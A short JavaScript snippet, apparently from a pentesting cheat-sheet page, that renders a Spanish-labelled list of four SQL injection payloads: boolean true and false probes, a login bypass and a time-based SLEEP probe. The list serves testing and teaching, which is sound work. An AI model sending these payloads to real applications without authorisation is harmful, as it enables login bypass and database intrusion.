
const payloads = {
  "Confirmar vulnerabilidad": [
    { titulo: "Lógica booleana", payload: "' AND 1=1 -- " },
    { titulo: "Lógica falsa", payload: "' AND 1=2 -- " },
    { titulo: "Bypass login", payload: "' OR '1'='1 -- " },
    { titulo: "Time-based", payload: "' AND SLEEP(5) -- " }
  ]
};

const container = document.getElementById("payloads");
for (let categoria in payloads) {
  const section = document.createElement("section");
  const title = document.createElement("h3");
  title.textContent = categoria;
  section.appendChild(title);

  payloads[categoria].forEach(p => {
    const item = document.createElement("pre");
    item.textContent = p.payload;
    section.appendChild(item);
  });

  container.appendChild(section);
}
